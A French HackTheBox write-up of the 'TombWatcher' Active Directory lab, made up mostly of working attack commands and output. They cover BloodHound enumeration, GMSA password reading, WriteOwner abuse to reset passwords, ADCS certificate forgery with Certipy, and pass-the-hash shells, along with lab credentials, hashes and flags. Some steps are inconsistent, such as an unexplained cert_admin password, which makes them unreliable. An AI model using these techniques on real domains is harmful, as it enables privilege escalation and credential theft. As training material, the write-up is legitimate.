# TombWatcher — HackTheBox Writeup

> **Plateforme :** HackTheBox  
> **OS :** Windows Server 2019 (Active Directory)  
> **Difficulté :** Medium  
> **Tags :** `Active Directory` `BloodHound` `Kerberos` `GMSA` `WriteOwner` `ADCS` `Pass-the-Hash`

---

## Résumé

TombWatcher est une machine Windows Active Directory orientée post-exploitation. La chaîne d'attaque repose sur l'énumération de l'AD avec BloodHound, l'exploitation d'une permission **WriteOwner**, un pivot via un compte **GMSA** (`ansible_dev$`), puis une élévation de privilèges par **ADCS** pour obtenir un shell Administrateur.

---

## 1. Reconnaissance — Scan Nmap

```bash
nmap -sC -sV -A -O -p- 10.10.11.72
```

Ports notables ouverts :

| Port | Service |
|------|---------|
| 53 | DNS |
| 80 | HTTP — IIS 10.0 |
| 88 | Kerberos |
| 389 / 636 | LDAP / LDAPS |
| 445 | SMB |
| 5985 | WinRM |
| 9389 | .NET Message Framing |

La présence des ports 88, 389 et 9389 confirme sans ambiguïté qu'on est face à un **Contrôleur de Domaine** : `DC01.tombwatcher.htb` dans le domaine `tombwatcher.htb`.

---

## 2. Énumération Active Directory

### 2.1 enum4linux & NetExec

Avec les credentials de départ (`henry` / `H3nry_987TGV!`), on énumère les utilisateurs, groupes et partages :

```bash
enum4linux -u 'henry' -p 'H3nry_987TGV!' -U -G -S -P 10.10.11.72
nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --gmsa --groups --users
```

Utilisateurs identifiés : `Administrator`, `krbtgt`, `Henry`, `Alfred`, `sam`, `john`, `ansible_dev$` (GMSA).

Point intéressant : le compte GMSA `ansible_dev$` n'est lisible que par les membres du groupe **Infrastructure** — dont henry ne fait pas partie (encore).

### 2.2 BloodHound — Cartographie du domaine

Collecte des données avec `bloodhound-python` :

```bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb \
  -c All -dc DC01.tombwatcher.htb -ns 10.10.11.72
```

> **Note :** Une erreur de clock skew (`KRB_AP_ERR_SKEW`) a nécessité une synchronisation NTP avec la cible avant de pouvoir demander des TGT Kerberos :
> ```bash
> sudo ntpdate -s 10.10.11.72
> ```

#### Mapping des membres du domaine

![BloodHound — Membres du groupe EVERYONE](Mapping.png)

On voit que le groupe `EVERYONE@TOMBWATCHER.HTB` regroupe l'ensemble des utilisateurs du domaine via `DOMAIN USERS`.

#### Chemin vers l'administrateur

![BloodHound — Chemin user → Administrator](user_to_admin_path.png)

BloodHound révèle que le groupe `ADMINISTRATORS@TOMBWATCHER.HTB` possède des permissions critiques sur l'objet `USERS@TOMBWATCHER.HTB` :
- **WriteOwner**
- **WriteDacl**
- **GenericWrite**
- **Owns**

#### Détail de la permission WriteOwner

![BloodHound — Permission WriteOwner](WriteOwner_authorisation.png)

La permission **WriteOwner** (héritée, ACL) de `ADMINISTRATORS` sur `USERS` permet de changer le propriétaire de l'objet, puis de s'accorder `GenericAll` dessus — ouvrant la voie à une prise de contrôle complète.

---

## 3. Foothold — Kerberoasting sur Alfred

Avec le ticket TGT d'Alfred obtenu via Impacket :

```bash
impacket-getTGT -dc-ip 10.10.11.72 tombwatcher.htb/Alfred:basketball
export KRB5CCNAME=./Alfred.ccache
```

Un hash Kerberos de type RC4 (`$krb5tgs$23$`) a été capturé pour le compte `Alfred`. Le mot de passe `basketball` était déjà connu — le hash confirme les credentials.

---

## 4. Pivot via GMSA — ansible_dev$

### 4.1 Rejoindre le groupe Infrastructure

Alfred a la capacité d'ajouter des membres au groupe **Infrastructure** (celui qui peut lire le mot de passe GMSA) :

```bash
bloodyAD -d tombwatcher.htb -u alfred -p basketball \
  --host 10.10.11.72 add groupMember Infrastructure alfred
[+] alfred added to Infrastructure
```

### 4.2 Lecture du mot de passe GMSA

```bash
nxc ldap 10.10.11.72 -u alfred -p basketball --gmsa
```

```
Account: ansible_dev$    NTLM: bf8b11e301f7ba3fdc616e5d4fa01c30
PrincipalsAllowedToReadPassword: Infrastructure
```

On peut également récupérer le mot de passe encodé en base64 directement :

```bash
bloodyAD -d tombwatcher.htb -u alfred -p basketball \
  --host 10.10.11.72 get object 'ansible_dev$' --attr msDS-ManagedPassword
```

Le hash NTLM de `ansible_dev$` est validé en SMB :

```bash
nxc smb 10.10.11.72 -u 'ansible_dev$' -H bf8b11e301f7ba3fdc616e5d4fa01c30
[+] tombwatcher.htb\ansible_dev$:bf8b11e301f7ba3fdc616e5d4fa01c30
```

---

## 5. Élévation vers john — Abus WriteOwner

Le compte GMSA `ansible_dev$` dispose des droits pour réinitialiser le mot de passe de `sam`. On en profite pour prendre la main sur `john` via la chaîne WriteOwner.

### 5.1 Reset du mot de passe de sam

```bash
bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p ':bf8b11e301f7ba3fdc616e5d4fa01c30' \
  --host 10.10.11.72 set password sam NewSamPass2025!
[+] Password changed successfully!
```

### 5.2 sam prend possession de john

```bash
# sam devient propriétaire de john
bloodyAD -d tombwatcher.htb -u sam -p NewSamPass2025! \
  --host 10.10.11.72 set owner john sam
[+] Old owner [...Domain Admins...] is now replaced by sam on john

# sam s'accorde GenericAll sur john
bloodyAD -d tombwatcher.htb -u sam -p NewSamPass2025! \
  --host 10.10.11.72 add genericAll john sam
[+] sam has now GenericAll on john
```

### 5.3 Reset du mot de passe de john

Grâce au script `abuse-writeowner.py` :

```bash
python3 abuse-writeowner.py -d tombwatcher.htb -u Alfred -p basketball \
  -vu john -dc 10.10.11.72 -np 'PwnedAbuse2025!'
```

Calcul du NT hash pour le Pass-the-Hash :

```bash
echo -n 'PwnedAbuse2025!' | iconv -t utf16le | openssl md4 | awk '{print $2}'
# dbf709f523c3d2292af87d62c267c1a1
```

---

## 6. User Flag — Shell WinRM avec john

```bash
evil-winrm -i 10.10.11.72 -u john -H dbf709f523c3d2292af87d62c267c1a1
```

```
*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt
349624aba3d7d6d7ed7d687ce3519ad5
```

🏴 **User flag obtenu !**

---

## 7. Root Flag — Élévation via ADCS (Certipy)

### 7.1 Découverte de cert_admin (objet supprimé)

Depuis le shell john, on liste les objets AD supprimés :

```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' `
  -includeDeletedObjects -property objectSid,lastKnownParent
```

Un compte `cert_admin` supprimé est retrouvé dans l'OU `ADCS`, avec son SID (`S-1-5-21-...-1109`). Cela indique une infrastructure ADCS en place.

### 7.2 Certipy — Recherche de templates vulnérables

```bash
certipy-ad find -u john@tombwatcher.htb \
  -hashes :dbf709f523c3d2292af87d62c267c1a1 \
  -dc-ip 10.10.11.72
```

11 templates activés, 1 CA identifiée : `tombwatcher-CA-1`.

### 7.3 Demande de certificat pour Administrator

```bash
certipy-ad req -u cert_admin@tombwatcher.htb -p '0xdf0xdf!' \
  -dc-ip 10.10.11.72 \
  -target dc01.tombwatcher.htb \
  -ca tombwatcher-CA-1 \
  -template WebServer \
  -upn administrator@tombwatcher.htb
```

### 7.4 Authentification et récupération du hash NT de l'Administrateur

```bash
certipy-ad auth -pfx admin_cert.pfx \
  -username administrator@tombwatcher.htb \
  -domain tombwatcher.htb \
  -dc-ip 10.10.11.72
```

Hash NT de l'Administrateur : `f61db423bebe3328d33af26741afe5fc`

### 7.5 Shell Administrateur

```bash
evil-winrm -i 10.10.11.72 -u Administrator -H f61db423bebe3328d33af26741afe5fc
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4de62322ad9081d7e6a23e2d78e54bfb
```

🏴 **Root flag obtenu !**

---

## Résumé de la chaîne d'attaque

```
henry (credentials)
  └─► BloodHound → découverte WriteOwner + GMSA
        └─► alfred ajoute alfred dans Infrastructure
              └─► Lecture GMSA ansible_dev$ (NTLM hash)
                    └─► ansible_dev$ reset password de sam
                          └─► sam → WriteOwner → GenericAll → reset john
                                └─► john (WinRM) — USER FLAG
                                      └─► Certipy ADCS → cert Administrator
                                            └─► Administrator (Pass-the-Hash) — ROOT FLAG
```

---

## Outils utilisés

| Outil | Usage |
|-------|-------|
| `nmap` | Scan de ports et détection de services |
| `enum4linux` | Énumération SMB/RPC |
| `NetExec (nxc)` | Validation credentials, GMSA, LDAP |
| `BloodHound` + `bloodhound-python` | Cartographie AD et identification des chemins d'attaque |
| `bloodyAD` | Manipulation des permissions et objets AD |
| `Impacket` (`getTGT`, `owneredit`, `dacledit`) | Ticketing Kerberos et édition ACL |
| `Certipy-ad` | Exploitation ADCS |
| `Evil-WinRM` | Shell distant WinRM |
| `ntpdate` | Synchronisation de l'horloge (correction du clock skew Kerberos) |

---

## Points clés retenus

- **BloodHound** est indispensable pour visualiser rapidement les chemins d'attaque dans un AD, même complexe.
- La permission **WriteOwner** est souvent sous-estimée : elle permet de devenir propriétaire d'un objet, puis de s'octroyer `GenericAll` et de tout contrôler.
- Les comptes **GMSA** peuvent devenir un pivot puissant si leur groupe de lecture est mal contrôlé.
- Le **clock skew Kerberos** est un classique en lab HTB — toujours penser à synchroniser l'horloge avec `ntpdate` ou `faketime`.
- **ADCS** (Active Directory Certificate Services) reste une surface d'attaque très fertile pour l'élévation de privilèges.
